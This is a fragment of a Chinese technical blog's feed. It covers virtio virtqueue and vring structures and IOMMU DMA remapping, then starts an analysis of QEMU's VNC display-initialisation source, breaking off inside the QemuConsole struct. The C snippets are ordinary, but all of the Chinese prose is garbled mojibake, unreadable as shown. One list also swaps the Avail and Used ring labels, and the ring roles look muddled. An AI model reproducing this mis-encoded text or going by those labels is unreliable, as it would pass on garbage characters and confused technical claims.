alt="è½¬è‡ª LoyenWang å…¬ä¼—å·çš„å›¾ç‰‡ï¼Œéå¸¸æ¸…æ™°çš„è¡¨ç¤ºäº† virtqueue å·¥ä½œåŸç†çš„ä¸€å¼ å›¾ï¼"></p><p>å¯¹äº virtqueue çš„æ“ä½œï¼Œåœ¨è®ºæ–‡ä¸­æŠ½è±¡æˆä¸€ä¸ªå‡½æ•°è¡¨ <code>virtqueue_ops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue_ops</span> &#123;</span><br>    <span class="hljs-type">int</span> (*add_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>                    <span class="hljs-keyword">struct</span> scatterlist sg[],<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> out_num,<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> in_num,<br>                    <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*kick)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">void</span> *(*get_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *len);<br>    <span class="hljs-type">void</span> (*disable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">bool</span> (*enable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>add_buf</code>ï¼šå‘ virtqueue ä¸­æ·»åŠ ä¸€ä¸ª buffer</li><li><code>kick</code> ï¼šé€šçŸ¥å¦ä¸€æ–¹æ–°åˆ°è¾¾äº†ä¸€ä¸ª buffer</li><li><code>get_buf</code> ä» virtqueue ä¸­è·å–ä¸€ä¸ª buffer</li><li><code>disable_cb</code>ï¼šé€šçŸ¥å¦ä¸€æ–¹å…³é—­ buffer åˆ°è¾¾çš„æç¤º</li><li><code>enable_cb</code>ï¼šé€šçŸ¥å¦ä¸€æ–¹å¼€å¯ buffer åˆ°è¾¾çš„æç¤º</li></ul><h3 id="II-VRingï¼švirtqueue-çš„åŸºæœ¬ç»“æ„">II. VRingï¼švirtqueue çš„åŸºæœ¬ç»“æ„</h3><p>virtqueue æ ¸å¿ƒçš„æ•°æ®ç»“æ„ä¾¿æ˜¯ <code>vring</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª<strong>ç¯å½¢ç¼“å†²åŒºé˜Ÿåˆ—</strong>ï¼Œå…¶ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>æè¿°ç¬¦è¡¨ï¼ˆDescï¼‰</li><li>å¯ç”¨æè¿°ç¬¦æ•°ç»„ï¼ˆUsedï¼‰</li><li>å·²ç”¨æè¿°ç¬¦æ•°ç»„ï¼ˆAvailï¼‰</li></ul><p><img src="https://s2.loli.net/2022/08/29/OrlAvYaFkZ3dIXt.png" alt="image.png"></p><p>ä¸€ä¸ªæè¿°ç¬¦ï¼ˆDescriptorï¼‰ä¸ºå¦‚ä¸‹ç»“æ„ï¼Œè¡¨ç¤ºäº†ä¸€å— buffer çš„åŸºæœ¬å±æ€§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ª Avail/Used è¡¨é¡¹é€šå¸¸æ˜¯å¤šä¸ª descriptor ä¸²è”çš„ bufferâ€”â€”è¿™ä¾¿æ˜¯ next åŸŸçš„ä½œç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_desc</span></span><br><span class="hljs-class">&#123;</span><br>    __u64 addr;<span class="hljs-comment">// Guest Physical Addresses</span><br>    __u32 len;<span class="hljs-comment">// é•¿åº¦</span><br>    __u16 flags;<span class="hljs-comment">// å±æ€§</span><br>    __u16 next;<span class="hljs-comment">// ä¸‹ä¸€ä¸ªæè¿°ç¬¦çš„ idx</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Avail</strong> æ•°ç»„ç”¨æ¥å­˜å‚¨å½“å‰å¯ç”¨çš„æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_avail</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    __u16 ring[NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Used</strong> æ•°ç»„åˆ™ç”¨æ¥å­˜å‚¨å·²ç»è¢«ä½¿ç”¨çš„æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span></span><br><span class="hljs-class">&#123;</span><br>    __u32 id;<br>    __u32 len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span> <span class="hljs-title">ring</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>Avail æ•°ç»„ä¸ Used æ•°ç»„åŒæ ·æ˜¯ä¸€ä¸ª<strong>ç¯å½¢é˜Ÿåˆ—</strong>ï¼Œä¸è¿‡è¿™ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«ç”±é€šä¿¡çš„ä¸¤æ–¹è¿›è¡Œä½¿ç”¨ï¼š</p><ul><li>æ•°æ®<strong>å‘é€æ–¹</strong>å‡†å¤‡å¥½æ•°æ®åä» <code>Avail é˜Ÿåˆ—</code> ä¸­è·å–å¯ç”¨çš„è¡¨é¡¹ï¼Œæ›´æ–°æè¿°ç¬¦è¡¨ï¼Œå¹¶åœ¨ <code>Used é˜Ÿåˆ—</code> ä¸­æ’å…¥æ–°çš„è¡¨é¡¹ï¼Œé€šçŸ¥æ¥æ”¶æ–¹æœ‰æ•°æ®åˆ°è¾¾</li><li>æ•°æ®<strong>æ¥æ”¶æ–¹</strong>ä» <code>Used é˜Ÿåˆ—</code> ä¸­å–å‡ºè¡¨é¡¹ï¼Œè¯»å–æè¿°ç¬¦è¡¨ä»¥è·å–æ•°æ®ï¼Œå®Œæˆå¤„ç†åå°†è¡¨é¡¹æ’å…¥åˆ° <code>Avail é˜Ÿåˆ—</code> ä¸­</li></ul><p>ä¸‹å›¾ä¸ºç”± Guest å‘ Host å‘é€æ•°æ®çš„ä¸€ä¸ª vring ç¤ºä¾‹ï¼š</p><p><img src="https://s2.loli.net/2022/08/29/8uUq1jacyEYGlXR.png" alt="è½¬è‡ª LoyenWang å…¬ä¼—å·çš„å›¾ç‰‡ï¼Œéå¸¸æ¸…æ™°çš„è¡¨ç¤ºäº† virtqueue å·¥ä½œåŸç†çš„ä¸€å¼ å›¾ï¼"></p><h3 id="III-virtio-é…ç½®æ“ä½œæŠ½è±¡">III. virtio é…ç½®æ“ä½œæŠ½è±¡</h3><p>ç»“åˆ virtqueueï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥æŠ½è±¡å‡ºä¸€ä¸ªè™šæ‹Ÿ PCI è®¾å¤‡çš„åŸºæœ¬æ“ä½œï¼š</p><ul><li>è·å– feature bits</li><li>è¯»å†™é…ç½®ç©ºé—´</li><li>è¯»å†™ status bits</li><li>è®¾å¤‡é‡ç½®</li><li>åˆ›å»º/é”€æ¯ virtqueue</li></ul><p>æˆ‘ä»¬å°†å…¶æŠ½è±¡æˆä¸€å¼ å‡½æ•°è¡¨ï¼š<code>virtio_config_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_config_ops</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">bool</span> (*feature)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> bit);<br>        <span class="hljs-type">void</span> (*get)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        <span class="hljs-type">void</span> (*<span class="hljs-built_in">set</span>)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        u8 (*get_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-type">void</span> (*set_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev, u8 status);<br>        <span class="hljs-type">void</span> (*reset)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *(*<span class="hljs-title">find_vq</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_device</span> *<span class="hljs-title">vdev</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">unsigned</span> <span class="hljs-title">index</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">void</span> (*<span class="hljs-title">callback</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *));</span><br>        <span class="hljs-type">void</span> (*del_vq)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>feature</code>ï¼šè·å–è®¾å¤‡å¯¹åº”çš„ feature bit</li><li><code>get &amp; set</code> ï¼šè¯»å†™è®¾å¤‡çš„é…ç½®ç©ºé—´</li><li><code>get_status &amp; set_status</code>ï¼šè¯»å†™è®¾å¤‡çš„ status bits</li><li><code>reset</code>ï¼šé‡ç½®è®¾å¤‡</li><li><code>find_vq</code>ï¼šè·å–/åˆ›å»º virtqueue</li><li><code>del_vq</code>ï¼šé”€æ¯ virtqueue</li></ul><h2 id="ä¸‰ã€IOMMU">ä¸‰ã€IOMMU</h2><blockquote><p>å¯ä»¥ç›´æ¥å‚è§ <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/intel-whitepaper-using-iommu-for-dma-protection-in-uefi.pdf">Intel çš„æ‰‹å†Œ</a></p></blockquote><p>IOMMU å³ <strong>Input/Output Memory Management Unit</strong>ï¼Œå…¶åŠŸèƒ½ç±»ä¼¼äº CPU ä¸­çš„ MMUï¼Œæ˜¯ä¸€ä¸ª<strong>å‘è®¾å¤‡ä¾§æä¾›åœ°å€ç¿»è¯‘åŠŸèƒ½çš„å•å…ƒ</strong></p><p><img src="https://s2.loli.net/2022/09/03/3GOTl4oAExSdPcL.png" alt="image.png"></p><p>IOMMU é€šå¸¸è¢«é›†æˆäºåŒ—æ¡¥ä¸­ï¼Œå…¶æä¾›é¢å‘è®¾å¤‡ç«¯çš„ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ul><li><strong>DMA é‡æ˜ å°„</strong>ï¼ˆ <strong>DMA remapping</strong>ï¼‰ï¼šæœ‰ç€ DMA åŠŸèƒ½çš„è®¾å¤‡å¯ä»¥ä½¿ç”¨è™šæ‹Ÿåœ°å€ï¼Œé€šè¿‡ IOMMU è½¬æ¢ä¸ºç‰©ç†åœ°å€è¿›è¡Œç›´æ¥å†…å­˜è®¿é—®</li><li><strong>ä¸­æ–­é‡æ˜ å°„</strong>ï¼ˆ<strong>Interrupt remapping</strong>ï¼‰ï¼šIOMMU ä¼šæ‹¦æˆªè®¾å¤‡äº§ç”Ÿçš„ä¸­æ–­ï¼Œæ ¹æ®ä¸­æ–­é‡æ˜ å°„è¡¨äº§ç”Ÿæ–°çš„ä¸­æ–­è¯·æ±‚å‘é€ç»™ LAPIC</li></ul><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png" alt="image.png"></p><h3 id="I-DMA-é‡æ˜ å°„">I. DMA é‡æ˜ å°„</h3><p>DMA é‡æ˜ å°„å³é¢å‘è®¾å¤‡ä¾§çš„åœ°å€è®¿é—®é‡ç¿»è¯‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§æ˜¯ CPU å¯¹å†…å­˜çš„è™šæ‹ŸåŒ–ï¼šMMU åˆ©ç”¨è¿›ç¨‹é¡µè¡¨å°†è¿›ç¨‹è¦è®¿é—®çš„è™šæ‹Ÿåœ°å€ç¿»è¯‘ä¸ºç‰©ç†åœ°å€ï¼Œä»è€Œå®ç°åœ¨ä¸¤ä¸ªè¿›ç¨‹ä¸­è®¿é—®åŒä¸€ä¸ªè™šæ‹Ÿåœ°å€å®é™…ä¸Šè®¿é—®åˆ°ä¸åŒçš„ç‰©ç†åœ°å€â€”â€”DMA é‡æ˜ å°„ä¹Ÿæ˜¯ç±»ä¼¼çš„åŸç†ï¼Œå¦‚ä¸‹å›¾å³ä¾§æ‰€ç¤ºï¼Œå½“å¤–è®¾æƒ³è¦è¿›è¡Œ DMA æ—¶ï¼ŒIOMMU ä¼šæ ¹æ®â€œè®¾å¤‡é¡µè¡¨â€è¿›è¡Œåœ°å€ç¿»è¯‘ï¼Œä»è€Œä½¿å¾—ä¸¤ä¸ªè®¾å¤‡å„è‡ªæ„ŸçŸ¥è®¿é—®çš„æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œä½†å®é™…ä¸Šè®¿é—®åˆ°äº†ä¸åŒçš„ç‰©ç†åœ°å€</p><p><img src="https://s2.loli.net/2022/09/03/B3yxUoClVsArMGp.png" alt="image.png"></p><p>DMA é‡æ˜ å°„æœ‰ç€ä»¥ä¸‹çš„ä¸¤ç§æ–¹å¼ï¼š</p><h4 id="â‘ -Request-without-PASID">â‘  Request-without-PASID</h4><p>åœ¨ IOMMU ä¸­ä½¿ç”¨äº†ä¸€ä¸ªâ€œäºŒå±‚é¡µè¡¨ + æ ‡å‡†é¡µè¡¨â€ç»“æ„æ¥å®ç° DMA é‡æ˜ å°„ï¼Œéœ€è¦å ç”¨éƒ¨åˆ†ç‰©ç†å†…å­˜ç©ºé—´ï¼š</p><ul><li><strong>Root Table</strong>ï¼šå­˜æ”¾å„ä¸ª bus çš„ DMA é‡æ˜ å°„è¡¨åœ°å€ï¼Œä¸€ä¸ª entry å¯¹åº”ä¸€ä¸ª bus</li><li><strong>Context Table</strong>ï¼šå­˜æ”¾å„ä¸ª domain çš„ DMA é‡æ˜ å°„è¡¨åœ°å€ï¼Œä¸€ä¸ª entry å¯¹åº”ä¸€ä¸ª domain</li><li><strong>Address Translation Structure</strong>ï¼šå®é™…çš„ DMA é‡æ˜ å°„é¡µè¡¨</li></ul><p>åœ¨ IOMMU ä¸­çš„å¯„å­˜å™¨ <strong>Root Table Address Register</strong> ç”¨ä»¥å­˜æ”¾æŒ‡å‘ Root-table çš„æŒ‡é’ˆ</p><p><img src="https://s2.loli.net/2022/09/03/TdAB3Um4xhzHKXZ.png" alt="image.png"></p><p>DMA é‡æ˜ å°„è¿˜éœ€è¦ä¸€ä¸ª id æ¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªè®¾å¤‡ï¼Œå¯¹äº PCI è®¾å¤‡è€Œè¨€ä¾¿æ˜¯å…¶ BDFï¼ˆBus/Device/Functionï¼‰ï¼Œå› æ­¤å®é™…çš„åœ°å€è®¿é—®è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/09/03/67FPkW2zafeMBpL.png" alt="çŸ¥ä¹å·çš„å›¾"></p><h4 id="â‘¡-Request-with-PASID">â‘¡ Request-with-PASID</h4><h3 id="II-ä¸­æ–­é‡æ˜ å°„">II.ä¸­æ–­é‡æ˜ å°„</h3><h3 id="III-IOMMU-ä¸è™šæ‹ŸåŒ–">III. IOMMU ä¸è™šæ‹ŸåŒ–</h3><p>è™½ç„¶ IOMMU çš„å¼•å…¥å¢åŠ äº†ä¸å¤–è®¾é€šä¿¡é—´çš„å¼€é”€ï¼Œä½† IOMMU è§£å†³äº†ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¸€ä¸ªéš¾ç‚¹ï¼šå¯¹äºéçº¯æ¨¡æ‹Ÿçš„è®¾å¤‡è€Œè¨€ï¼Œå…¶å¹¶ä¸çŸ¥é“ GPA ä¸ HPA ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œå½“å…¶æŒ‰ Guest OS æä¾›çš„åœ°å€è¿›è¡Œ DMA æ—¶<strong>ä¼šç›´æ¥è®¿é—®åˆ° Host çš„å†…å­˜</strong></p><p>å½“å¼•å…¥äº† IOMMU ä¹‹åï¼ŒIOMMU å¯ä»¥æ ¹æ® Host ä¾§æä¾›çš„ GPA åˆ° HPA ä¹‹é—´çš„åœ°å€è½¬æ¢è¡¨ï¼Œè¿›è¡Œ<strong>DMA remapping</strong>ï¼Œè¿™æ ·å¤–è®¾å°±èƒ½æ­£å¸¸åœ°è®¿é—®åˆ° Guest çš„ç‰©ç†å†…å­˜ï¼Œè€Œä¸ä¼šé”™è¯¯åœ°è®¿é—®åˆ° Host å¯¹åº”çš„ç‰©ç†å†…å­˜åŒºåŸŸ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è™šæ‹ŸåŒ–æ–¹å‘YLGé€Ÿæˆå…¥é—¨æŒ‡åŒ—&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRT.0x01ã€‘Qemu - IIï¼šVNC æ¨¡å—æºç åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/</id>
    <published>2022-07-21T17:39:15.000Z</published>
    <updated>2022-08-19T16:32:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>vncï¼ŒğŸ•éƒ½ä¸ç”¨</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>VNC å³ Virtual Network Computingï¼Œæ˜¯åŸºäº**RFBï¼ˆRemote Frame Bufferï¼‰**åè®®è¿›è¡Œé€šä¿¡çš„è¿œç¨‹æ¡Œé¢åè®®ï¼Œä¸ telnetã€ssh ç­‰ç›¸æ¯”ï¼ŒVNC æœ€å¤§çš„ç‰¹ç‚¹ä¾¿æ˜¯æ”¯æŒå›¾å½¢åŒ–äº†ï¼Œç”¨æˆ·å¯ä»¥çœ‹åˆ°è¿œç¨‹æœºå™¨çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œä¸”èƒ½ä½¿ç”¨é”®ç›˜ä¸é¼ æ ‡è¿›è¡Œè¾“å…¥</p><p>Qemu è™šæ‹ŸæœºåŒæ ·æ”¯æŒé€šè¿‡ VNCåªéœ€è¦æŒ‡å®š <code>-vnc</code> å‚æ•°ä¾¿èƒ½å¤Ÿå»ºç«‹ VNC Serverï¼Œä»è€Œä½¿å¾—è¿œç¨‹ç”¨æˆ·å¯ä»¥é€šè¿‡ VNC è¿æ¥åˆ° Qemu è™šæ‹Ÿæœºä¸Š</p><p>æœ¬ç¯‡ä¸»è¦æ˜¯å¯¹ Qemu ä¸­ VNC å®ç°çš„æºç åˆ†æï¼ŒåŒæ—¶ä¹Ÿä¼šå¤¹æ‚ç€éƒ¨åˆ† Qemu æ˜¾ç¤ºç›¸å…³çš„åˆ†æï¼Œæºç ç‰ˆæœ¬ Qemu 7.0.0</p><h1>0x01. qemu_init_displays() - æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“ Qemu çš„å…¥å£å‡½æ•°æ˜¯ <code>softmmu/main.c</code> ä¸­çš„ <code>qemu_main()</code>ï¼Œåœ¨å…¶ä¸­ä¼šè°ƒç”¨åˆ° <code>sotftmmuvl.c</code> ä¸­çš„ <code>qemu_init()</code> å‡½æ•°è¿›è¡Œ Qemu çš„åˆå§‹åŒ–å·¥ä½œï¼ŒåŒ…æ‹¬ä¸€ç³»åˆ—çš„å‚æ•°è§£æã€è®¾å¤‡åˆå§‹åŒ–ç­‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">undef</span> main</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> main qemu_main</span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    qemu_init(argc, argv, envp);<br>    qemu_main_loop();<br>    qemu_cleanup();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ¬ç¯‡æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸ VNC ç›¸å…³çš„å†…å®¹ï¼Œæ³¨æ„åˆ°åœ¨ <code>qemu_init()</code> çš„æœ«å°¾ä¼šè°ƒç”¨åˆ° <code>qemu_init_displays()</code> è¿›è¡Œæ˜¾ç¤ºåˆå§‹åŒ–çš„å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    qemu_init_displays();<br>    <br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€çŸ­ï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ <code>init_displaystate()</code> ä¸ <code>qemu_display_init()</code> å¯¹è™šæ‹Ÿæœºæœ¬åœ°çš„æ˜¾ç¤ºè®¾å¤‡è¿›è¡Œåˆå§‹åŒ–ï¼Œä¹‹åæ‰æ˜¯ä½¿ç”¨ <code>qemu_opts_foreach</code> å®æ¥éå†å‚æ•°ä¸­ä¸ vnc ç›¸å…³çš„é…ç½®ï¼Œæœ€åè°ƒç”¨åˆ°çš„æ˜¯ <code>vnc_init_func()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init_displays</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DisplayState *ds;<br><br>    <span class="hljs-comment">/* åˆå§‹åŒ–æœ¬åœ°æ˜¾ç¤º */</span><br>    ds = init_displaystate();<br>    qemu_display_init(ds, &amp;dpy);<br><br>    <span class="hljs-comment">/* å¿…é¡»åœ¨ç»ˆç«¯åˆå§‹åŒ–å, ç”± SDL åº“æ›´æ”¹ä¿¡å·çš„ handlers */</span><br>    os_setup_signal_handling();<br><br>    <span class="hljs-comment">/* åˆå§‹åŒ–è¿œç¨‹æ˜¾ç¤º */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    qemu_opts_foreach(qemu_find_opts(<span class="hljs-string">&quot;vnc&quot;</span>),<br>                      vnc_init_func, <span class="hljs-literal">NULL</span>, &amp;error_fatal);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (using_spice) &#123;<br>        qemu_spice.display_init();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“">ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“</h2><p>åœ¨ Qemu å½“ä¸­æœ‰ç€å¤šä¸ªä¸æ˜¾ç¤ºè®¾å¤‡ç›¸å…³çš„ç»“æ„ï¼Œä»–ä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><blockquote><p>æœ¬å›¾æ¥è‡ªäº<a href="https://www.linux-kvm.org/images/b/b2/01x10b-QEMUGfraphics.pdf">è¿™ä¸ªppt</a></p></blockquote><h3 id="Iã€QemuConsole-å•ä¸ªæ§åˆ¶å°å®ä¾‹">Iã€QemuConsole - å•ä¸ªæ§åˆ¶å°å®ä¾‹</h3><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰æˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸ªæ–°çš„ç»“æ„ä½“ï¼š<code>QemuConsole</code>ï¼Œä¸€ä¸ªè¯¥ç»“æ„ä½“å®ä¾‹åœ¨ Qemu ä¸­è¡¨ç¤ºä¸€ä¸ªæ§åˆ¶å°ï¼ˆconsoleï¼‰å®ä¾‹ï¼Œå¯¹åº”ç€<strong>ä¸€ä¸ªç‰¹å®šçš„ VGA è®¾å¤‡ä¸ä¸€ç»„ç‰¹å®šçš„è¾“å…¥è®¾å¤‡</strong>ã€‚åœ¨ Qemu å½“ä¸­ä¸»è¦æœ‰ä¸¤ç±»æ§åˆ¶å°ï¼šå›¾å½¢åŒ–æ§åˆ¶å°ä¸å­—ç¬¦å‹æ§åˆ¶å°ã€‚</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuConsole</span> &#123;</span><br>    Object parent;<br><br>    <span 